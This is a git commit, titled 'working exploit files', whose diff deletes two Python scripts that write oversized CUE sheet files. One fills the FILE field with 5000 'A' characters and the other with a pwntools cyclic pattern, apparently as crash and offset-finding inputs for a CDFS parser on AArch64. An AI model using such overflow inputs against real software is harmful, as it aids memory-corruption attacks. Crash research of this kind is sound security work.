9ba02f26866d4c2f0a0fd1b92e3a6503823f9620
Alexa Noto <smile@whimsicalwillow.>
2025-12-16 02:13:16 +0000

    working exploit files

--- formats/cdfs/asci_ovf.py
+++
@@ -1,7 +0,0 @@
-# ascii_overflow.py
-with open("formats/cdfs/overflow.cue", "wb") as f:
-    f.write(b'FILE "')
-    f.write(b'A' * 5000)          # PURE ASCII
-    f.write(b'" BINARY\n')
-    f.write(b'TRACK 01 MODE1/2352\n')
-    f.write(b'  INDEX 01 00:00:00\n')
--- formats/cdfs/cycpatt.py
+++
@@ -1,7 +0,0 @@
-from pwnlib.util.cyclic import cyclic
-pattern = cyclic(5000, n=8)  # AArch64 uses 8-byte units
-with open("formats/cdfs/pattern.cue", "wb") as f:
-    f.write(b'FILE "' + pattern + b'" BINARY\n')
-    f.write(b"  TRACK 01 MODE1/2352\n")
-    f.write(b"    INDEX 01 00:00:00\n")
-print("Wrote formats/cdfs/pattern.cue")
